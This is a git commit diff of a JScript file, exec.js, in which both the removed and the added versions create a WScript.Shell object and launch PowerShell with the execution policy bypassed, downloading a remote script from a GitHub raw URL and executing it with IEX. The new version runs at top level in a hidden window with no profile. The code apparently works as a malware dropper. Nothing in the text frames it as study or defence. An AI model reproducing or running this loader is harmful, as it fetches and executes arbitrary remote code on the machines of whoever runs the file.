19e0d91b23cda137888d30cd20fe6c066d1e6fb3
DemonT-T <121691737+DemonT-T@users.noreply.github.com>
2026-01-10 02:05:37 +0100

    Update exec.js

--- exec.js
+++ exec.js
@@ -1,4 +1,4 @@
-function Exec(payload) {
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.Run("powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DemonT-T/fsda/refs/heads/main/exec.ps1'); Exec -Payload '" + payload + "'\"");
-}
+var shell = new ActiveXObject("WScript.Shell");
+var command = "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DemonT-T/fsda/refs/heads/main/exec.ps1')\"";
+shell.Run(command, 0, true);
+
